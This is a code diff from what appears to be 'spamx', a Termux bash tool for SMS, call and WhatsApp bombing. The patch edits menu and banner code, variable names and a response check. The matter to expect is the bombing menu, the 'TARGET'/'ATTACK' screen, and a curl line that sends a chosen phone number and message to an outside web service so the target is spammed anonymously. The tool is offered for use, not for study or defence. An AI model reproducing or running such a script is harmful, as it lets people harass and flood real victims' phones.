@@ -173,7 +173,7 @@ fi
 }
 spams(){
 clear
-bnr
+bnr1
 echo -e "\e[92m[\e[91m1\e[92m]\e[93m Bomb Sms+Call\e[93m"
 echo -e "\e[92m[\e[91m2\e[92m]\e[93m Bomb Sms\e[93m"
 echo -e "\e[92m[\e[91m3\e[92m]\e[93m Bomb Call\e[93m"
@@ -786,20 +786,20 @@ clear
 echo -e "\e[93m
 ╭━━━━━━━━━━━╮
 ┃━━━●━══━━━━┃
-┃           ┃ \e[91m TARGET-\e[92m$mob \e[93m
+┃           ┃ \e[91m TARGET-\e[92m$mobz \e[93m
 ┃   \e[91mSPAMX\e[93m   ┃ \e[91m ATTACK-\e[92mWHATS ANON \e[93m
 ┃           ┃ \e[93m
 ┃           ┃ [\e[91m1\e[93m]\e[92m Whats Anon \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
 ┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
 ┃           ┃     \e[91m REMAINING-\e[92m["$remnz"] \e[93m
-┃\e[34m"$mob"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
+┃\e[34m"$mobz"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
 ┃           ┃ --------------------------
 ┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/9113948054
 ╰━━━━━━━━━━━╯
 "
 curl -L -s "https://demo.briskey.in/wa-spamx/?whatsapp=$mobz&msg=$msgz&submit=Submit" > utis.txt
 value=$( grep -o " " utis.txt)
-if [[ $value = " " ]]
+if [[ $value = "" ]]
 then
 echo
 echo
@@ -825,7 +825,7 @@ cd $HOME/spamx
 rm er3.txt >/dev/null 2>&1
 fi
 }
-anondd(){
+anonddz(){
 cd /data/data/com.termux/files/home/spamx/server/whatz
 name=reminz
 if [[ -e $name.txt || -L $name.txt ]] ; then
